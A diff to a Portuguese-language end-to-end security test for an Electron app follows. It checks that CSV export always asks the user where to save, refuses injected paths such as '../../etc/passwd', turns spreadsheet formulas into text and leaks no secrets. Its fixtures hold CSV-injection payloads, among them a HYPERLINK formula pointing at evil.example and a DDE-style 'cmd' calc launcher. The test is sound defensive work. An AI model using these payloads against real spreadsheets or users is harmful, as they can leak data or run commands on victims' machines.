@@ -2,9 +2,11 @@
 // Testes de segurança com o programa aberto de verdade. Cada passo tenta fazer algo que NÃO deve funcionar.
 // Rodar: xvfb-run -a node test/e2e/seguranca.js
 const fs = require('fs');
+const os = require('os');
 const path = require('path');
 const assert = require('node:assert/strict');
 const { criarAmbiente, passo, CHAVE_DE_TESTE } = require('./ajuda');
+const { ler: lerCsv } = require('../csv');
 
 const FIX = process.env.FIXTURES || __dirname;
 
@@ -50,6 +52,38 @@ const FIX = process.env.FIXTURES || __dirname;
   assert.deepEqual(fs.readdirSync(path.join(amb.raiz, 'compras')).filter(f => !/^c\d\.json$/.test(f)), [], 'nada indevido foi gravado na pasta');
   assert.equal(fs.readdirSync(path.join(amb.raiz, 'notas')).length, 0, 'nenhum arquivo indevido em notas/');
   passo('argumentos maliciosos pelo IPC (pasta fora da lista, id com ../, tipo errado, tamanho excessivo) são recusados e nada é gravado');
+
+  /* ---------- 2b) planilha: quem escolhe onde gravar é a pessoa, e texto malicioso não vira fórmula ---------- */
+  const sufixo = Date.now() + '-' + process.pid;
+  const destinoCsv = path.join(os.tmpdir(), 'e2e-seg-' + sufixo + '.csv');
+  const iscas = [path.join(os.tmpdir(), 'e2e-isca1-' + sufixo + '.csv'), path.join(os.tmpdir(), 'e2e-isca2-' + sufixo + '.csv')];
+  // dados como se uma nota com texto escondido (ou alguém com acesso à pasta) tivesse escrito fórmulas nos nomes
+  amb.grava('servicos', 'evil', { nome: '=HYPERLINK("http://evil.example/?k=1","clique")', ordem: 50 });
+  amb.grava('compras', 'evil1', { servicoId: 'evil', descricao: '@SUM(1+1)', totalCents: 100, parcelas: 1, parcelaCents: 100, inicio: '2026-11', pagas: {}, ordem: 50 });
+  amb.grava('compras', 'evil2', { servicoId: 'evil', descricao: '+cmd|" /C calc"!A0;\n-2+3', totalCents: 200, parcelas: 2, parcelaCents: 100, inicio: '2026-11', pagas: {}, ordem: 51 });
+  await app.evaluate(({ dialog }, d) => { global.__salvarChamadas = 0; global.__salvarResposta = { canceled: false, filePath: d }; dialog.showSaveDialog = async () => { global.__salvarChamadas++; return global.__salvarResposta; }; }, destinoCsv);
+  const exportada = await chamar('export:csv', iscas[0], { filePath: iscas[1] }, '../../etc/passwd');
+  assert.equal(exportada.ok, true);
+  assert.equal(exportada.v.arquivo, path.basename(destinoCsv), 'o arquivo vai para onde a janela do sistema mandou');
+  assert.equal(await app.evaluate(() => global.__salvarChamadas), 1, 'a janela de salvar é sempre mostrada: a tela não consegue pular a escolha');
+  assert.ok(fs.existsSync(destinoCsv));
+  for (const isca of iscas) assert.equal(fs.existsSync(isca), false, 'a tela tentou escolher o caminho ' + isca + ' e não conseguiu');
+  const csv = fs.readFileSync(destinoCsv, 'utf8');
+  const tabela = lerCsv(csv.slice(1)); // sem a marca de ordem de bytes
+  assert.ok(tabela.length > 4);
+  const celulasDeTexto = tabela.slice(1).flatMap(l => [l[0], l[1]]);
+  assert.deepEqual(celulasDeTexto.filter(c => /^[=+\-@\t\r]/.test(c)), [], 'nenhum texto da planilha começa como fórmula');
+  assert.ok(celulasDeTexto.includes('\'=HYPERLINK("http://evil.example/?k=1","clique")'), 'o nome malicioso aparece como texto, com apóstrofo');
+  assert.ok(celulasDeTexto.includes("'@SUM(1+1)"));
+  assert.ok(celulasDeTexto.includes('\'+cmd|" /C calc"!A0; -2+3'), 'a quebra de linha do texto virou espaço e a linha não se partiu');
+  assert.ok(tabela.slice(1).every(l => l.length === 10), 'todas as linhas têm as 10 colunas');
+  for (const segredo of [CHAVE_DE_TESTE, 'TTTTTTTT', 'ContasAPagar', 'config.json', os.tmpdir()]) assert.ok(!csv.includes(segredo), 'a planilha vazou: ' + segredo);
+  await app.evaluate(() => { global.__salvarResposta = { canceled: true, filePath: undefined }; });
+  const cancelada = await chamar('export:csv');
+  assert.deepEqual(cancelada, { ok: true, v: null });
+  assert.equal(await app.evaluate(() => global.__salvarChamadas), 2);
+  fs.rmSync(destinoCsv, { force: true });
+  passo('planilha: o caminho nunca vem da tela, fórmulas (=, +, -, @) viram texto, nada de chave nem de caminhos no arquivo, e cancelar não grava');
 
   /* ---------- 3) tentativas de sair da pasta do programa pelo protocolo app:// ---------- */
   const segredoNaPasta = path.join(amb.compartilhada, 'segredo.txt');
